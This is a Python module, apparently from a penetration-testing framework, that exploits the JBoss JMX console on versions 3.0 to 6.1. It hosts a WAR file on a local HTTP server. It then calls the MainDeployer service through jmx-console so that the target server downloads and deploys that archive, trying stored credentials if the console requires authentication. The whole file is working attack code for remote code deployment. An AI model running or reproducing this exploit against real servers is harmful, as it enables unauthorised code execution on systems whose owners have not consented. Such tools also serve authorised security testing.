from src.platform.jboss.interfaces import JINTERFACES
from src.platform.jboss.authenticate import checkAuth
from src.module.deploy_utils import _serve, waitServe
from collections import OrderedDict
from threading import Thread
from requests import get, exceptions
from time import sleep
from log import LOG
from os.path import abspath
import utility

versions = ["3.0", "3.2", "4.0", "4.2", "6.0", "6.1"]
title = JINTERFACES.JMX
def deploy(fingerengine, fingerprint):
    """
    """

    war_file = abspath(fingerengine.options.deploy)
    war_name = war_file.rsplit('/', 1)[1] 
    
    # start up the local HTTP server
    server_thread = Thread(target=_serve, args=(war_file,))
    server_thread.start()
    sleep(2)
    
    # major versions of JBoss have different method indices
    methodIndex = {"3.0" : 21,
                  "3.2" : 22,
                  "4.0" : 3,
                  "4.2" : 3,
                  "6.0" : 19,
                  "6.1" : 19
                  }

    if fingerprint.version == "3.0":
        tmp = utility.capture_input("Version 3.0 has a strict WAR XML structure.  "
                              "Ensure your WAR is compatible with 3.0 [Y/n]")
        if 'n' in tmp.lower():
            return

    utility.Msg("Preparing to deploy {0}..".format(war_file))

    url = 'http://{0}:{1}/jmx-console/HtmlAdaptor'.format(
                    fingerengine.options.ip, fingerprint.port)

    data = OrderedDict([
                    ('action', 'invokeOp'),
                    ('name', 'jboss.system:service=MainDeployer'),
                    ('methodIndex', methodIndex[fingerprint.version]),
                    ('arg0', 'http://{0}:8000/{1}'.format(
                                            utility.local_address(), war_name))
                    ])

    response = utility.requests_post(url, data=data)
    if response.status_code == 401:
        utility.Msg("Host %s:%s requires auth for JMX, checking..." %
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            try:
                response = utility.requests_post(url, data=data,
                                            cookies=cookies[0], auth=cookies[1])
            except exceptions.Timeout:
                # we should be fine here, so long as we get the POST request off.
                # Just means that we haven't gotten a response quite yet.
                response.status_code = 200

        else:
            utility.Msg("Could not get auth for %s:%s" %
                             (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
            return

    if response.status_code == 200:
        if waitServe(server_thread):
            utility.Msg("{0} deployed to {1}".format(war_file,
                                                    fingerengine.options.ip),
                                                    LOG.SUCCESS)
    else:
        utility.Msg("Failed to call {0} (HTTP {1})".format
                               (fingerengine.options.ip, response.status_code),
                               LOG.ERROR)

        # kill our local HTTP server
        try:
            get("http://localhost:8000/", timeout=1.0)
        except:
            pass
